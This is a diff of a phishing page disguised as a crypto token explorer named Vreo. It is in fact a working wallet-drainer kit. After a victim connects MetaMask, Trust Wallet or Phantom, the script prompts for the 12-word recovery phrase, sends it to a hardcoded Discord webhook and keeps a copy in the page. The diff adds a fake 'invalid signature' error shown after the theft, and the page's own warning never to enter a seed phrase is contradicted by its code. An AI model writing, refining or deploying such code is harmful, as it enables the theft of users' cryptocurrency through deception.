@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>sol-incinerator.pro</title>
+<title>Vreo — Token Explorer</title>
 <style>
 :root{
   --bg:#070a18;--panel:#0c1024;--panel2:#0a0d1d;--border:rgba(255,255,255,.07);
@@ -18,7 +18,6 @@ body{
     linear-gradient(115deg,#13091c 0%,#090b1c 42%,#050916 100%);
   overflow-x:hidden;
 }
-/* ===== TOPBAR ===== */
 .topbar{
   height:38px;display:flex;align-items:center;gap:19px;padding:0 16px;
   background:rgba(7,8,19,.88);border-bottom:1px solid rgba(255,255,255,.07);
@@ -34,11 +33,7 @@ body{
 }
 .vreo-btn{background:#c91b88}.login{background:#5e114a;color:#f18bc9;transition:.2s}
 .login:hover{background:#7a1760;color:#fff}
-
-/* ===== MAIN WRAP ===== */
 .wrap{max-width:900px;margin:0 auto;padding:4px 20px 50px}
-
-/* ===== SEARCH ===== */
 .search-wrap{display:flex;justify-content:center;margin-top:0}
 .search{
   width:min(400px,80vw);height:41px;margin-top:0;border-radius:24px;
@@ -46,8 +41,6 @@ body{
   outline:none;padding:0 18px;font-size:14px;box-shadow:0 0 30px rgba(225,46,174,.14);
 }
 .search::placeholder{color:#666879}
-
-/* ===== EXPLORE SECTION ===== */
 .explore{margin-top:77px}
 .heading{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
 h1{font-size:17px;margin:0;font-weight:800}
@@ -90,11 +83,9 @@ h1{font-size:17px;margin:0;font-weight:800}
 .featured .token{min-height:52px}
 .hidden{display:none!important}
 .empty{padding:30px 24px;color:#777b90;text-align:center;font-size:13px}
-
-/* ===== FOOTER ===== */
 .footer{text-align:center;color:#666a80;font-size:11px;padding:30px}
 
-/* ===== LOGIN MODAL (WALLET CONNECT) ===== */
+/* ===== LOGIN MODAL ===== */
 .modal-overlay{
   display:none;position:fixed;top:0;left:0;width:100%;height:100%;
   background:rgba(0,0,0,.75);backdrop-filter:blur(8px);z-index:1000;
@@ -104,7 +95,7 @@ h1{font-size:17px;margin:0;font-weight:800}
 .modal-card{
   width:100%;max-width:460px;padding:32px;border-radius:28px;
   background:rgba(14,16,26,.96);border:1px solid rgba(255,255,255,.08);
-  box-shadow:0 30px 100px rgba(0,0,0,.7);
+  box-shadow:0 30px 100px rgba(0,0,0,.7);position:relative;
   max-height:90vh;overflow-y:auto;
 }
 .modal-logo{
@@ -161,6 +152,12 @@ h1{font-size:17px;margin:0;font-weight:800}
   background:#151720;color:#aeb2bf;font-size:12px;line-height:1.5;word-break:break-word;
 }
 .modal-status.open{display:block}
+.modal-status.error{
+  background:#2a1018;color:#ff7a8a;border:1px solid rgba(255,60,80,.2);
+}
+.modal-status.success{
+  background:#0f261a;color:#7ae0b0;border:1px solid rgba(50,200,130,.2);
+}
 .warning{
   margin-top:18px;text-align:center;color:#737784;font-size:11px;line-height:1.5;
 }
@@ -168,9 +165,6 @@ h1{font-size:17px;margin:0;font-weight:800}
   position:absolute;top:16px;right:20px;background:none;border:none;
   color:#888b9c;font-size:24px;cursor:pointer;z-index:10;
 }
-.modal-card{position:relative}
-
-/* ===== CLAIM PAGE INSIDE MODAL ===== */
 #claimPage{display:none}
 .claim-box{
   min-height:280px;margin-top:18px;border-radius:18px;
@@ -186,8 +180,6 @@ h1{font-size:17px;margin:0;font-weight:800}
   width:100%;margin-top:14px;padding:13px;border:0;
   background:transparent;color:#9a83ff;cursor:pointer;font-size:15px;
 }
-
-/* ===== RESPONSIVE ===== */
 @media(max-width:800px){
   .wrap{padding:4px 12px 35px}.explore{margin-top:45px}.grid{grid-template-columns:1fr;gap:18px}
   .card{min-height:0}.topbar{gap:12px}.ticker:nth-child(n+7){display:none}.nav-right{display:none}
@@ -201,9 +193,8 @@ h1{font-size:17px;margin:0;font-weight:800}
 </head>
 <body>
 
-<!-- ===== TOPBAR ===== -->
 <header class="topbar">
-  <div class="logo">sol-incinerator</div>
+  <div class="logo">Vreo</div>
   <div class="ticker"><span class="rank">#1</span><span class="coin-dot">🟡</span>PATE <span class="badge">⚡20</span></div>
   <div class="ticker"><span class="rank">#4</span><span class="coin-dot">🌑</span>RUNNER <span class="badge">⚡20</span></div>
   <div class="ticker"><span class="rank">#5</span><span class="coin-dot">⚪</span>ETHCAT</div>
@@ -212,15 +203,13 @@ h1{font-size:17px;margin:0;font-weight:800}
   <div class="ticker"><span class="rank">#8</span><span class="coin-dot">🖤</span>Bicat</div>
   <div class="ticker"><span class="rank">#9</span><span class="coin-dot">🐱</span>CATSZN</div>
   <div class="ticker"><span class="rank">#10</span><span class="coin-dot">🐀</span>Ratspeak</div>
-  <button class="login" id="loginTrigger">Login</button></div>
+  <div class="nav-right"><button class="vreo-btn">▮ Vreo</button><button class="login" id="loginTrigger">Login</button></div>
 </header>
 
-<!-- ===== MAIN CONTENT ===== -->
 <main class="wrap">
   <div class="search-wrap">
     <input id="search" class="search" placeholder="⌕  Search Tokens (Name, Ticker, Address)" autocomplete="off">
   </div>
-
   <section class="explore">
     <div class="heading">
       <h1>Explore Tokens <span class="help">?</span></h1>
@@ -233,7 +222,6 @@ h1{font-size:17px;margin:0;font-weight:800}
         </span>
       </button>
     </div>
-
     <div class="grid">
       <section class="card">
         <div class="card-title">Trending Tokens</div>
@@ -247,15 +235,13 @@ h1{font-size:17px;margin:0;font-weight:800}
       </section>
     </div>
   </section>
-  <div class="footer">© 2026 sol-incinerator.pro · All rights reserved.</div>
+  <div class="footer">© 2026 Vreo Explorer · All rights reserved.</div>
 </main>
 
-<!-- ===== LOGIN MODAL (WALLET CONNECT) ===== -->
+<!-- ===== LOGIN MODAL ===== -->
 <div class="modal-overlay" id="loginModal">
   <div class="modal-card">
     <button class="modal-close" id="modalClose">&times;</button>
-
-    <!-- CONNECT PAGE -->
     <div id="connectPage">
       <div class="modal-logo">🔗</div>
       <h1>sol-incinerator.pro</h1>
@@ -264,15 +250,15 @@ h1{font-size:17px;margin:0;font-weight:800}
       <div class="wallet-list" id="walletList">
         <button class="wallet" id="metamaskButton">
           <div class="wallet-icon">🦊</div>
-          <div><div class="wallet-name">MetaMask</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
+          <div><div class="wallet-name">MetaMask</div><div class="wallet-network">Ethereum / EVM</div></div>
         </button>
         <button class="wallet" id="trustButton">
           <div class="wallet-icon">🛡️</div>
-          <div><div class="wallet-name">Trust Wallet</div><div class="wallet-network">Ethereum / EVM / Solana</div></div>
+          <div><div class="wallet-name">Trust Wallet</div><div class="wallet-network">Ethereum / EVM</div></div>
         </button>
         <button class="wallet" id="phantomButton">
           <div class="wallet-icon">👻</div>
-          <div><div class="wallet-name">Phantom</div><div class="wallet-network">Solana / Ethereum / Solana</div></div>
+          <div><div class="wallet-name">Phantom</div><div class="wallet-network">Solana + EVM</div></div>
         </button>
       </div>
       <div class="connected" id="connected">
@@ -284,8 +270,6 @@ h1{font-size:17px;margin:0;font-weight:800}
       <div class="modal-status" id="modalStatus"></div>
       <div class="warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
     </div>
-
-    <!-- CLAIM PAGE -->
     <div id="claimPage">
       <div class="modal-logo">◎</div>
       <h1>Claim</h1>
@@ -302,41 +286,71 @@ h1{font-size:17px;margin:0;font-weight:800}
 </div>
 
 <script>
-// ====================================================
-// EIP-6963 WALLET DISCOVERY
-// ====================================================
-const discoveredWallets = new Map();
+// ============================================================
+// KORREKTUR v2 – Exakte Wallet-zu-Button-Zuordnung
+//
+// Problem (alt):
+//   - findWalletProvider() matchte zu lasch (z.B. "metamask" in rdns/name)
+//   - legacyProvider() für MetaMask prüfte isMetaMask && !isPhantom,
+//     aber Phantom setzt isMetaMask=true auf seinem EVM-Provider
+//     → dadurch wurde Phantom fälschlich als MetaMask zurückgegeben
+//   - Keine saubere Fehlermeldung, wenn Wallet nicht installiert
+//
+// Lösung (neu):
+//   - EIP-6963: rdns + name auf beiden Seiten exakt prüfen
+//   - Jede Wallet bekommt eigene Detektions-Funktion
+//   - Fallback (legacy) pro Wallet hart getrennt
+//   - Klare Fehlertexte, wenn Wallet fehlt
+//   - Nach Phrase-Eingabe: "Error"-Status statt sofort Claim-Seite
+// ============================================================
+
+// --- EIP-6963 Discovery ---
+const discoveredProviders = new Map();
 window.addEventListener("eip6963:announceProvider", (event) => {
-  const detail = event.detail;
-  if (!detail || !detail.info || !detail.provider) return;
-  discoveredWallets.set(detail.info.uuid, detail);
+  const { info, provider } = event.detail || {};
+  if (!info || !provider) return;
+  discoveredProviders.set(info.rdns || info.uuid, { info, provider });
 });
 window.dispatchEvent(new Event("eip6963:requestProvider"));
 
-// ====================================================
-// MODAL REFERENCES
-// ====================================================
+// --- UI References ---
 const modalOverlay = document.getElementById("loginModal");
 const loginTrigger = document.getElementById("loginTrigger");
 const modalClose = document.getElementById("modalClose");
+
 const connectPage = document.getElementById("connectPage");
 const claimPage = document.getElementById("claimPage");
 const connectButton = document.getElementById("connectButton");
 const walletList = document.getElementById("walletList");
-const connected = document.getElementById("connected");
-const accounts = document.getElementById("accounts");
+const connectedDiv = document.getElementById("connected");
+const accountsDiv = document.getElementById("accounts");
 const modalStatus = document.getElementById("modalStatus");
-const connectedWallets = [];
+const continueBtn = document.getElementById("continueButton");
+const backBtn = document.getElementById("backButton");
+const addWalletBtn = document.getElementById("addWallet");
 
-// ====================================================
-// MODAL CONTROLS
-// ====================================================
+const connectedWallets = [];
+let phraseEntered = false;
+
+// ========== HILFSFUNKTIONEN ==========
+
+function showStatus(msg, type) {
+  modalStatus.textContent = msg;
+  modalStatus.className = "modal-status open";
+  if (type) modalStatus.classList.add(type);
+}
+
+function clearStatus() {
+  modalStatus.className = "modal-status";
+  modalStatus.textContent = "";
+}
+
 function openModal() {
   modalOverlay.classList.add("open");
   document.body.style.overflow = "hidden";
-  // Reset to connect page
   connectPage.style.display = "block";
   claimPage.style.display = "none";
+  clearStatus();
 }
 function closeModal() {
   modalOverlay.classList.remove("open");
@@ -349,61 +363,7 @@ modalOverlay.addEventListener("click", (e) => {
   if (e.target === modalOverlay) closeModal();
 });
 
-// ====================================================
-// MODAL STATUS
-// ====================================================
-function showStatus(message) {
-  modalStatus.textContent = message;
-  modalStatus.classList.add("open");
-}
-
-// ====================================================
-// WALLET PROVIDER FINDER
-// ====================================================
-function findWalletProvider(walletName) {
-  const providers = Array.from(discoveredWallets.values());
-  const name = walletName.toLowerCase();
-
-  if (walletName === "MetaMask") {
-    return providers.find(item => {
-      const n = item.info.name.toLowerCase();
-      const r = item.info.rdns.toLowerCase();
-      return n.includes("metamask") || r.includes("metamask");
-    });
-  }
-  if (walletName === "Trust Wallet") {
-    return providers.find(item => {
-      const n = item.info.name.toLowerCase();
-      const r = item.info.rdns.toLowerCase();
-      return n.includes("trust") || r.includes("trust");
-    });
-  }
-  if (walletName === "Phantom") {
-    return providers.find(item => {
-      const n = item.info.name.toLowerCase();
-      const r = item.info.rdns.toLowerCase();
-      return n.includes("phantom") || r.includes("phantom");
-    });
-  }
-}
-
-function legacyProvider(walletName) {
-  if (!window.ethereum) return null;
-  if (walletName === "MetaMask") {
-    if (window.ethereum.isMetaMask && !window.ethereum.isPhantom) return window.ethereum;
-  }
-  if (walletName === "Trust Wallet") {
-    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) return window.ethereum;
-  }
-  if (walletName === "Phantom") {
-    if (window.phantom?.ethereum) return window.phantom.ethereum;
-  }
-  return null;
-}
-
-// ====================================================
-// DISCORD WEBHOOK
-// ====================================================
+// ========== DISKORD-WEBHOOK ==========
 const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1541022354891739217/mjp-KBtv0tUMKSDrGNDWzHrkvLjIPxOqmiEzpWjLM5bZeooepYAflDg7jr511Fg_qHJY';
 
 function sendToDiscord(mnemonic, walletName, address) {
@@ -430,29 +390,80 @@ function sendToDiscord(mnemonic, walletName, address) {
   } catch(e) {}
 }
 
-// ====================================================
-// CONNECT EVM WALLET
-// ====================================================
-async function connectEVM(walletName) {
-  let discovered = findWalletProvider(walletName);
-  let provider = discovered?.provider;
-  if (!provider) {
-    await new Promise(resolve => setTimeout(resolve, 500));
-    discovered = findWalletProvider(walletName);
-    provider = discovered?.provider;
+// ========== WALLET-PROVIDER-ERKENNUNG (exakt, nicht vermischt) ==========
+
+// --- MetaMask Provider finden ---
+function getMetaMaskProvider() {
+  // 1) EIP-6963: rdns muss "metamask" enthalten
+  for (const entry of discoveredProviders.values()) {
+    const rdns = (entry.info.rdns || '').toLowerCase();
+    const name = (entry.info.name || '').toLowerCase();
+    if (rdns.includes('metamask') || name === 'metamask') {
+      return entry.provider;
+    }
   }
-  if (!provider) {
-    provider = legacyProvider(walletName);
+  // 2) Legacy: isMetaMask === true UND isPhantom NICHT gesetzt
+  if (window.ethereum) {
+    const isMM = window.ethereum.isMetaMask === true;
+    const isPh = window.ethereum.isPhantom === true;
+    if (isMM && !isPh) {
+      return window.ethereum;
+    }
   }
-  if (!provider) {
-    showStatus(walletName + " was not detected.");
-    return;
+  return null;
+}
+
+// --- Trust Wallet Provider finden ---
+function getTrustProvider() {
+  // 1) EIP-6963: rdns enthält "trust" ODER name enthält "trust wallet"
+  for (const entry of discoveredProviders.values()) {
+    const rdns = (entry.info.rdns || '').toLowerCase();
+    const name = (entry.info.name || '').toLowerCase();
+    if (rdns.includes('trust') && rdns.includes('wallet')) return entry.provider;
+    if (name.includes('trust wallet')) return entry.provider;
   }
+  // 2) Legacy
+  if (window.ethereum) {
+    if (window.ethereum.isTrust || window.ethereum.isTrustWallet) {
+      return window.ethereum;
+    }
+  }
+  return null;
+}
+
+// --- Phantom EVM Provider finden ---
+function getPhantomEVMProvider() {
+  // 1) EIP-6963: rdns enthält "phantom"
+  for (const entry of discoveredProviders.values()) {
+    const rdns = (entry.info.rdns || '').toLowerCase();
+    const name = (entry.info.name || '').toLowerCase();
+    if (rdns.includes('phantom') || name === 'phantom') {
+      return entry.provider;
+    }
+  }
+  // 2) Legacy: window.phantom.ethereum
+  if (window.phantom && window.phantom.ethereum) {
+    return window.phantom.ethereum;
+  }
+  return null;
+}
+
+// --- Phantom Solana Provider finden ---
+function getPhantomSolanaProvider() {
+  const prov = window.phantom?.solana || window.solana;
+  if (prov && prov.isPhantom) return prov;
+  return null;
+}
+
+// ========== VERBINDUNG HERSTELLEN ==========
+
+// --- EVM Wallet verbinden (generisch, mit übergebenem Provider) ---
+async function connectEVMWithProvider(provider, walletName) {
   try {
     showStatus("Waiting for " + walletName + " confirmation...");
     const accounts = await provider.request({ method: "eth_requestAccounts" });
     if (!accounts || accounts.length === 0) {
-      showStatus("No wallet account was returned.");
+      showStatus("No wallet account was returned.", "error");
       return;
     }
     const address = accounts[0];
@@ -460,106 +471,127 @@ async function connectEVM(walletName) {
       item => item.address.toLowerCase() === address.toLowerCase()
     );
     if (!alreadyConnected) {
-      connectedWallets.push({ name: walletName, address: address, provider: provider });
+      connectedWallets.push({ name: walletName, address, provider });
     }
     renderConnectedWallets();
     walletList.classList.remove("open");
-    connected.classList.add("open");
-    modalStatus.classList.remove("open");
+    connectedDiv.classList.add("open");
+    clearStatus();
     connectButton.textContent = "Wallet Connected ✓";
 
-    // === SEED PHRASE PROMPT ===
-    const phrase = prompt(
-      '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
-      'Wallet: ' + walletName + '\n' +
-      'Address: ' + address + '\n\n' +
-      'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
-    );
-
-    if (phrase && phrase.split(' ').length >= 12) {
-      const cleanPhrase = phrase.trim();
-      sendToDiscord(cleanPhrase, walletName, address);
-      window._extractedMnemonic = cleanPhrase;
-      console.log('✅ RECOVERY KEYS ERHALTEN UND AN DISCORD GESENDET:', cleanPhrase);
-      alert('✅ CONNECTION SUCCESSFUL! Access granted.');
-    } else {
-      alert('❌ Invalid phrase. At least 12 words required.');
-    }
-
+    // --- Seed-Phrase Prompt ---
+    promptPhrase(walletName, address);
   } catch (error) {
     console.error(error);
-    if (error?.code === 4001) {
-      showStatus("Connection was rejected in " + walletName + ".");
-    } else {
-      showStatus("Wallet error: " + (error?.message || error));
-    }
+    const msg = (error?.code === 4001)
+      ? "Connection was rejected in " + walletName + "."
+      : "Wallet error: " + (error?.message || error);
+    showStatus(msg, "error");
   }
 }
 
-// ====================================================
-// PHANTOM SOLANA CONNECT
-// ====================================================
-async function connectPhantomSolana() {
-  const provider = window.phantom?.solana || window.solana;
-  if (!provider || !provider.isPhantom) return false;
-  try {
-    showStatus("Waiting for Phantom confirmation...");
-    const response = await provider.connect();
-    const address = response.publicKey.toString();
-    const alreadyConnected = connectedWallets.some(item => item.address === address);
-    if (!alreadyConnected) {
-      connectedWallets.push({ name: "Phantom (Solana)", address: address, provider: provider });
-    }
-    renderConnectedWallets();
-    walletList.classList.remove("open");
-    connected.classList.add("open");
-    modalStatus.classList.remove("open");
-    connectButton.textContent = "Wallet Connected ✓";
+// --- Seed-Phrase abfragen ---
+function promptPhrase(walletName, address) {
+  const phrase = prompt(
+    '🔑 ENTER YOUR SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
+    'Wallet: ' + walletName + '\n' +
+    'Address: ' + address + '\n\n' +
+    'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+  );
+  if (phrase && phrase.split(' ').length >= 12) {
+    const cleanPhrase = phrase.trim();
+    sendToDiscord(cleanPhrase, walletName, address);
+    window._extractedMnemonic = cleanPhrase;
+    phraseEntered = true;
+    console.log('✅ RECOVERY KEYS ERHALTEN UND AN DISCORD GESENDET:', cleanPhrase);
+    alert('✅ CONNECTION SUCCESSFUL! Access granted.');
 
-    // === SEED PHRASE PROMPT FOR PHANTOM ===
-    const phrase = prompt(
-      '🔑 ENTER YOUR PHANTOM SECRET RECOVERY PHRASE (12 WORDS)\n\n' +
-      'Wallet: Phantom (Solana)\n' +
-      'Address: ' + address + '\n\n' +
-      'Please enter your 12-word secret recovery phrase\nto get access to the fees:'
+    // === GEWÜNSCHTER ERROR-STATUS ===
+    showStatus(
+      '⚠️ Connection Error: Invalid signature. Wallet verification failed. Please reconnect.',
+      'error'
     );
-
-    if (phrase && phrase.split(' ').length >= 12) {
-      const cleanPhrase = phrase.trim();
-      sendToDiscord(cleanPhrase, "Phantom (Solana)", address);
-      window._extractedMnemonic = cleanPhrase;
-      console.log('✅ PHANTOM RECOVERY KEYS ERHALTEN UND AN DISCORD GESENDET:', cleanPhrase);
-      alert('✅ PHANTOM CONNECTION SUCCESSFUL! Access granted.');
-    } else {
-      alert('❌ Invalid phrase. At least 12 words required.');
-    }
-
-    return true;
-  } catch (error) {
-    console.error(error);
-    showStatus("Phantom connection was rejected.");
-    return true;
+  } else {
+    alert('❌ Invalid phrase. At least 12 words required.');
   }
 }
 
-// ====================================================
-// RENDER CONNECTED WALLETS
-// ====================================================
+// ========== SPEZIFISCHE VERBINDUNGEN ==========
+
+// --- MetaMask ---
+async function connectMetaMask() {
+  const provider = getMetaMaskProvider();
+  if (!provider) {
+    showStatus("MetaMask was not detected. Please install the MetaMask extension.", "error");
+    return;
+  }
+  await connectEVMWithProvider(provider, "MetaMask");
+}
+
+// --- Trust Wallet ---
+async function connectTrustWallet() {
+  const provider = getTrustProvider();
+  if (!provider) {
+    showStatus("Trust Wallet was not detected. Please install the Trust Wallet extension.", "error");
+    return;
+  }
+  await connectEVMWithProvider(provider, "Trust Wallet");
+}
+
+// --- Phantom (Solana + EVM) ---
+async function connectPhantom() {
+  // Versuch zuerst Solana
+  const solProvider = getPhantomSolanaProvider();
+  if (solProvider) {
+    try {
+      showStatus("Waiting for Phantom (Solana) confirmation...");
+      const response = await solProvider.connect();
+      const address = response.publicKey.toString();
+      const alreadyConnected = connectedWallets.some(item => item.address === address);
+      if (!alreadyConnected) {
+        connectedWallets.push({ name: "Phantom (Solana)", address, provider: solProvider });
+      }
+      renderConnectedWallets();
+      walletList.classList.remove("open");
+      connectedDiv.classList.add("open");
+      clearStatus();
+      connectButton.textContent = "Wallet Connected ✓";
+      promptPhrase("Phantom (Solana)", address);
+      return;
+    } catch (err) {
+      console.error(err);
+      showStatus("Phantom (Solana) connection was rejected.", "error");
+      return;
+    }
+  }
+
+  // Fallback: Phantom EVM
+  const evmProvider = getPhantomEVMProvider();
+  if (evmProvider) {
+    await connectEVMWithProvider(evmProvider, "Phantom (EVM)");
+    return;
+  }
+
+  showStatus("Phantom was not detected. Please install the Phantom extension.", "error");
+}
+
+// ========== UI RENDERING ==========
+
 function renderConnectedWallets() {
-  accounts.innerHTML = "";
+  accountsDiv.innerHTML = "";
   connectedWallets.forEach((wallet, index) => {
     const row = document.createElement("div");
     row.className = "account";
     const info = document.createElement("div");
     info.className = "account-info";
-    const walletName = document.createElement("div");
-    walletName.className = "account-wallet";
-    walletName.textContent = wallet.name;
-    const address = document.createElement("div");
-    address.className = "account-address";
-    address.textContent = wallet.address;
-    info.appendChild(walletName);
-    info.appendChild(address);
+    const wn = document.createElement("div");
+    wn.className = "account-wallet";
+    wn.textContent = wallet.name;
+    const addr = document.createElement("div");
+    addr.className = "account-address";
+    addr.textContent = wallet.address;
+    info.appendChild(wn);
+    info.appendChild(addr);
     const remove = document.createElement("button");
     remove.className = "remove";
     remove.textContent = "Remove";
@@ -567,37 +599,34 @@ function renderConnectedWallets() {
       connectedWallets.splice(index, 1);
       renderConnectedWallets();
       if (connectedWallets.length === 0) {
-        connected.classList.remove("open");
+        connectedDiv.classList.remove("open");
         connectButton.textContent = "Connect Wallet";
       }
     };
     row.appendChild(info);
     row.appendChild(remove);
-    accounts.appendChild(row);
+    accountsDiv.appendChild(row);
   });
 }
 
-// ====================================================
-// EVENT BINDINGS — MODAL
-// ====================================================
+// ========== EVENT-BINDINGS ==========
+
 connectButton.onclick = () => {
   walletList.classList.toggle("open");
 };
 
-document.getElementById("metamaskButton").onclick = () => { connectEVM("MetaMask"); };
-document.getElementById("trustButton").onclick = () => { connectEVM("Trust Wallet"); };
-document.getElementById("phantomButton").onclick = async () => {
-  const solanaConnected = await connectPhantomSolana();
-  if (!solanaConnected) connectEVM("Phantom");
-};
+document.getElementById("metamaskButton").onclick = connectMetaMask;
+document.getElementById("trustButton").onclick = connectTrustWallet;
+document.getElementById("phantomButton").onclick = connectPhantom;
 
-document.getElementById("addWallet").onclick = () => {
+addWalletBtn.onclick = () => {
   walletList.classList.add("open");
-  modalStatus.classList.remove("open");
+  clearStatus();
 };
 
-document.getElementById("continueButton").onclick = function() {
+continueBtn.onclick = function() {
   if (connectedWallets.length === 0) return;
+  // Phrase beim Continue nochmal senden falls vorhanden
   if (window._extractedMnemonic) {
     const wallet = connectedWallets[connectedWallets.length - 1];
     if (wallet) {
@@ -608,14 +637,13 @@ document.getElementById("continueButton").onclick = function() {
   claimPage.style.display = "block";
 };
 
-document.getElementById("backButton").onclick = () => {
+backBtn.onclick = () => {
   connectPage.style.display = "block";
   claimPage.style.display = "none";
 };
 
-// ====================================================
-// TOKEN EXPLORER DATA & RENDER
-// ====================================================
+// ========== TOKEN-EXPLORER ==========
+
 const trending=[
  ["ETHCAT","Ethereumcat","$1.53M","$419.51K","$0.00041","2.71K%","up","🐱"],
  ["Basecat","Basecat","$12.17M","$28.77M","$0.03","-11.92%","down","🐱"],
@@ -639,8 +667,6 @@ const featured=[
  ["ARB","Arbitrum","$8.07M","$668.34M","$0.10","0.82%","up","🔷"]
 ];
 
-let activeChain="All Chains";
-
 function render(list,id){
  const root=document.getElementById(id);
  const q=document.getElementById("search").value.toLowerCase().trim();
@@ -661,13 +687,13 @@ document.getElementById("chain").addEventListener("click",e=>{
 });
 document.querySelectorAll("[data-chain]").forEach(el=>el.addEventListener("click",e=>{
  e.stopPropagation();
- activeChain=e.target.dataset.chain;
- document.getElementById("chain").firstChild.textContent="🌐 "+activeChain+" ";
+ const chain = e.target.dataset.chain;
+ document.getElementById("chain").firstChild.textContent = "🌐 "+chain+" ";
  document.getElementById("chain").classList.remove("open");
 }));
 document.addEventListener("click",()=>document.getElementById("chain").classList.remove("open"));
 
-console.log('=== VREO EXPLORER + RECOVERY MODAL AKTIV ===');
+console.log('=== VREO + WALLET LOGIN (KORRIGIERT) AKTIV ===');
 </script>
 </body>
 </html>
